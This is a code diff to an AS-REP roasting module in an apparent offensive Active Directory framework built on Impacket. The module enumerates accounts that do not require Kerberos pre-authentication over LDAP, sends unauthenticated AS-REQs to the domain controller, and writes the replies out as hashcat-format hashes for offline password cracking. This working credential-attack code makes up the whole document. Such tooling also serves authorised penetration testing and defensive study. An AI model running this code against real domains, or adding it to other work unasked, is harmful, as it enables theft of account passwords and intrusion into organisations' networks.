@@ -1,13 +1,20 @@
-"""AS-REP roasting capability (Impacket-backed, hashcat format)."""
+"""AS-REP roasting capability (Impacket-backed, hashcat format).
+
+Uses shared ldap_connect for enumeration; roasting itself is unauthenticated
+AS-REQ traffic to the KDC.
+"""
 
 from __future__ import annotations
 
 import json
 from typing import Any
 
+from ldap3 import SUBTREE
 from rich.console import Console
 
+from adaf_attack.core.auth import describe_auth
 from adaf_attack.core.graph import AttackGraph
+from adaf_attack.core.ldap_util import ldap_connect
 from adaf_attack.core.redaction import redact
 from adaf_attack.core.registry import register_capability
 from adaf_attack.core.session import Session
@@ -49,25 +56,9 @@ class AsrepRoast:
             ) from exc
 
         console.print(f"[bold]AS-REP Roast[/bold] → {target.domain} @ {target.dc_ip}")
+        console.print(f"[dim]Auth (LDAP enum): {describe_auth(target)}[/dim]")
 
-        from ldap3 import ALL, SUBTREE, Connection, Server
-
-        server = Server(target.dc_ip, get_info=ALL, use_ssl=target.ldaps)
-        if target.username and (target.password or target.hashes):
-            conn = Connection(
-                server,
-                user=target.auth_user,
-                password=target.password or "",
-                authentication="NTLM",
-                auto_bind=True,
-            )
-        else:
-            conn = Connection(server, auto_bind=True)
-
-        base_dn = server.info.other.get("defaultNamingContext", [None])[0]
-        if not base_dn:
-            base_dn = ",".join(f"DC={p}" for p in target.domain.split("."))
-
+        conn, base_dn, _config = ldap_connect(target)
         conn.search(
             base_dn,
             "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))",
@@ -91,7 +82,6 @@ class AsrepRoast:
 
         for sam in candidates:
             try:
-                # Build a minimal AS-REQ without pre-auth (classic AS-REP roast)
                 domain = target.domain.upper()
 
                 as_req = AS_REQ()
@@ -129,12 +119,17 @@ class AsrepRoast:
                 as_req["req-body"]["till"] = KerberosTime.to_asn1(now + datetime.timedelta(days=1))
                 as_req["req-body"]["rtime"] = KerberosTime.to_asn1(now + datetime.timedelta(days=1))
                 as_req["req-body"]["nonce"] = random.getrandbits(31)
-                as_req["req-body"]["etype"][0] = int(constants.EncryptionTypes.rc4_hmac.value)
+                as_req["req-body"]["etype"][0] = int(
+                    constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value
+                )
+                as_req["req-body"]["etype"][1] = int(
+                    constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value
+                )
+                as_req["req-body"]["etype"][2] = int(constants.EncryptionTypes.rc4_hmac.value)
 
                 raw = encoder.encode(as_req)
                 response = sendReceive(raw, domain, target.dc_ip)
 
-                # Parse AS-REP
                 from impacket.krb5.asn1 import AS_REP
 
                 as_rep, _ = decoder.decode(response, asn1Spec=AS_REP())
@@ -152,10 +147,11 @@ class AsrepRoast:
                     {
                         "account": sam,
                         "hash": hashcat_line,
-                        "format": "hashcat-18200",
+                        "format": f"hashcat-18200-etype{etype}",
+                        "etype": etype,
                     }
                 )
-                console.print(f"  [green]✓[/green] {sam}")
+                console.print(f"  [green]✓[/green] {sam}  etype={etype}")
             except Exception as exc:  # noqa: BLE001
                 console.print(f"  [red]✗[/red] {sam}  ({exc})")
                 roasted.append({"account": sam, "error": str(exc)})
@@ -168,11 +164,11 @@ class AsrepRoast:
 
         redacted = redact(result, include_secrets=include_secrets)
         out_path = session.path("asrep-roast.json")
-        out_path.write_text(json.dumps(redacted, indent=2, default=str))
+        out_path.write_text(json.dumps(redacted, indent=2, default=str), encoding="utf-8")
 
         if include_secrets and hash_lines:
             hashes_path = session.path("asrep-roast.hashes.txt")
-            hashes_path.write_text("\n".join(hash_lines) + "\n")
+            hashes_path.write_text("\n".join(hash_lines) + "\n", encoding="utf-8")
             console.print(f"Hashcat file → {hashes_path}")
 
         graph.save(session.path("graph.json"))
